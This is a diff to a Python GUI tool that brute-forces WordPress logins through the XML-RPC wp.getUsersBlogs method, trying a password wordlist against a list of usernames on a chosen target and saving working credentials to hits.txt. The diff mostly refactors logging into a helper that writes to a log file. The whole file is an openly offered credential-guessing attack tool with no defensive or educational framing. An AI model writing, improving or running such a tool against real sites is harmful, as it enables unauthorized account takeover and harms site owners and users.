@@ -1,11 +1,21 @@
 import os
 import json
-import threads
 import customtkinter as ctk
 from tkinter import filedialog, messagebox
 import xmlrpc.client
 import threading
 
+# === Setup ===
+log_file_path = "xvector_log.txt"
+
+def log(message):
+    log_box.insert("end", message + "\n")
+    log_box.see("end")
+    try:
+        with open(log_file_path, "a") as f:
+            f.write(message + "\n")
+    except Exception as e:
+        print(f"Logging error: {e}")
 
 def run_brute_force():
     target = target_entry.get().strip()
@@ -20,6 +30,11 @@ def run_brute_force():
         messagebox.showerror("File Error", "Password wordlist file does not exist.")
         return
 
+    # Clear previous log at start of each run
+    open(log_file_path, "w").close()
+
+    log("[*] Starting brute-force attack...")
+
     try:
         with open(wordlist_path, 'r') as f:
             passwords = [line.strip() for line in f if line.strip()]
@@ -27,36 +42,30 @@ def run_brute_force():
         messagebox.showerror("File Error", f"Could not read password file:\n{e}")
         return
 
-    log_box.insert("end", "[*] Starting brute-force attack...\n")
-    log_box.see("end")
-    app.update()
-
     try:
         server = xmlrpc.client.ServerProxy(target)
     except Exception as e:
-        log_box.insert("end", f"[!] Connection error: {e}\n")
-        log_box.see("end")
+        log(f"[!] Connection error: {e}")
         return
 
     for user in usernames:
-        log_box.insert("end", f"\n[*] Trying user: {user}\n")
+        log(f"\n[*] Trying user: {user}")
         for password in passwords:
             try:
                 resp = server.wp.getUsersBlogs(user, password)
                 if resp:
-                    hit = f"[+] SUCCESS: {user}:{password}\n"
-                    log_box.insert("end", hit)
+                    hit = f"[+] SUCCESS: {user}:{password}"
+                    log(hit)
                     with open("hits.txt", "a") as hit_file:
-                        hit_file.write(hit)
+                        hit_file.write(hit + "\n")
                     break
             except xmlrpc.client.Fault:
                 continue
             except Exception as e:
-                log_box.insert("end", f"[!] Error with {user}: {e}\n")
+                log(f"[!] Error with {user}: {e}")
                 break
             log_box.see("end")
-    log_box.insert("end", "\n[*] Brute-force completed.\n")
-    log_box.see("end")
+    log("\n[*] Brute-force completed.")
 
 def browse_wordlist():
     path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
